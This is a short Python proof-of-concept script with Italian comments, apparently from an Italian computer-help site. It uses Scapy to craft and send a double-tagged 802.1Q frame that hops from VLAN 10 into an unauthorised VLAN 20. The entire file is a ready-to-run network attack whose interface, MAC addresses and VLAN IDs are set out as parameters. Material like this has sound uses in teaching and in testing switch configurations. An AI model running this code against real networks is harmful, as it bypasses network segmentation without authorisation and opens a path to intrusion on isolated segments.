# Proof-of-Concept: VLAN Hopping via Double Tagging
# Aiutocomputerhelp.it 2025
#--------------------------------------------------
from scapy.all import Ether, Dot1Q, IP, UDP, sendp

# Configurazione dei parametri dell'attacco
iface = "eth0"  # Modifica con l'interfaccia di rete corretta
target_mac = "ff:ff:ff:ff:ff:ff"  # Può essere MAC specifico o broadcast
attacker_mac = "00:11:22:33:44:55"  # MAC dell'attaccante
outer_vlan = 10  # VLAN visibile allo switch vulnerabile
inner_vlan = 20  # VLAN target (non autorizzata)

# Creazione del frame Ethernet con doppio tag 802.1Q
packet = (
    Ether(src=attacker_mac, dst=target_mac) /
    Dot1Q(vlan=outer_vlan) /  # Primo tag VLAN
    Dot1Q(vlan=inner_vlan) /  # Secondo tag VLAN
    IP(dst="192.168.20.1", src="192.168.10.100") /  # Simuliamo una richiesta alla VLAN 20
    UDP(dport=80, sport=12345) /  # Protocollo di trasporto a scelta
    b"Test VLAN Hopping Attack"  # Payload del pacchetto
)

# Invio del pacchetto sulla rete
sendp(packet, iface=iface, verbose=True)
